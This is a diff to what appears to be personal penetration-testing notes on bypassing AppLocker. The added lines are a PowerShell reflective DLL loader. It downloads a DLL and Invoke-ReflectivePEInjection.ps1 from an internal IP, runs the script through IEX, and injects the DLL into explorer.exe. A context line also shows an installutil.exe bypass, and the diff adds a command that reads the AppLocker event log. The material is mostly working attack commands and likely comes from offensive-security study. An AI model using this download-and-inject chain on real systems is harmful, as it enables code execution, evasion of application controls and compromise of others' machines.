@@ -24,5 +24,13 @@ C:\Windows\Microsoft.NET\Framework64\v4.0.30319\installutil.exe /logfile= /LogTo
 
 - reflective dll loader, put this in bypass.exe
 ```
-String cmd = "$bytes = (New-Object System.Net.WebClient).DownloadData('http://192.168.119.120/met.dll');(New-Object System.Net.WebClient).DownloadString('http://192.168.119.120/Invoke-ReflectivePEInjection.ps1') | IEX; $procid = (Get-Process -Name explorer).Id; Invoke-ReflectivePEInjection -PEBytes $bytes -ProcId $procid";
+$bytes = (New-Object System.Net.WebClient).DownloadData('http://192.168.45.192/bruh.dll')
+(New-Object System.Net.WebClient).DownloadString('http://192.168.45.192/Invoke-ReflectivePEInjection.ps1') | IEX
+$procid = (Get-Process -Name explorer).Id
+Invoke-ReflectivePEInjection -PEBytes $bytes -ProcId $procid
+```
+
+- check if applocker blocking:
+```
+`Get-WinEvent -LogName "Microsoft-Windows-AppLocker/MSI and Script" -MaxEvents 10`
 ```
